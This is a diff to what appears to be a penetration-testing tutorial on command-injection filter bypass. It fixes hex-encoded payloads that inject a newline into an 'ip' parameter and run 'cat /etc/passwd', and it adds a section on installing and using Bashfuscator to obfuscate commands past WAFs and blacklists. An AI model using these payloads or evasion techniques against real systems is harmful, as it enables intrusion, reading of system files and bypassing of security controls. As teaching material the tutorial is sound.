@@ -416,12 +416,61 @@ sh<<<$(xxd -r -p <<< 636174202f6574632f706173737764)
 **Hex Payloads:**
 
 ```bash
-ip=127.0.0.1%0abash<<<$(xxd%09-d<<<636174202f6574632f706173737764)
+ip=127.0.0.1%0abash<<<$(xxd%09-r%09-p<<<636174202f6574632f706173737764)
 
-ip=127.0.0.1%0ash<<<$(xxd%09-d<<<636174202f6574632f706173737764)
+ip=127.0.0.1%0ash<<<$(xxd%09-r%09-p<<<636174202f6574632f706173737764)
 ```
 
 Word-based filtering mechanisms often fail to account for shell evaluation order and runtime transformations. Techniques such as **case manipulation**, **string reversal**, and **encoding** allow attackers to reconstruct blocked commands dynamically, rendering exact-match filters ineffective when input is interpreted by a shell.
+
+---
+
+### Automated Obfuscation Tools
+
+When dealing with more advanced security mechanisms — such as WAFs, heuristic-based detection, or behavioral analysis — manual obfuscation techniques may no longer be sufficient. In these cases, automated obfuscation frameworks can be used to generate highly transformed command payloads that evade pattern-based detection.
+
+One such tool is `Bashfuscator`, an automated Bash command obfuscation framework. Rather than relying on a single evasion technique, Bashfuscator applies multiple layers of transformation to a command, producing functionally equivalent output that is significantly harder to analyze or match against static signatures. Depending on configuration, the resulting obfuscated command may range from a few dozen characters to several thousand characters in length.
+
+At a high level, `Bashfuscator` operates by taking a valid `bash` command and transforming it through a series of syntax-preserving obfuscation layers. These transformations rely on standard `bash` features such as:
+
+- Parameter and variable expansion
+- Arithmetic expansion
+- Command substitution
+- String encoding and reconstruction
+- Runtime evaluation (eval-style execution paths)
+
+Rather than simply encoding a command, `Bashfuscator` restructures it so that the original command is reconstructed dynamically at runtime, often through multiple intermediate steps. This makes it difficult for blacklist-based filters and signature-driven WAFs to detect the original intent of the command.
+
+Before installing `Bashfuscator`, make sure that you have the necessary dependencies:
+
+```bash
+sudo apt update
+sudo apt install python3 python3-pip python3-argcomplete xclip
+```
+
+Install `Bashfuscator`:
+
+```bash
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+python3 setup.py install --user
+```
+
+Once installed, `Bashfuscator` can be used from the `/bashfuscator/bin` directory.
+
+**Examples:**
+
+```bash
+./bashfuscator -c 'cat /etc/passwd'
+```
+
+Bashfuscator supports multiple configuration options that control how aggressively the command is obfuscated. 
+
+For example:
+
+```bash
+./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
+```
 
 ---
 
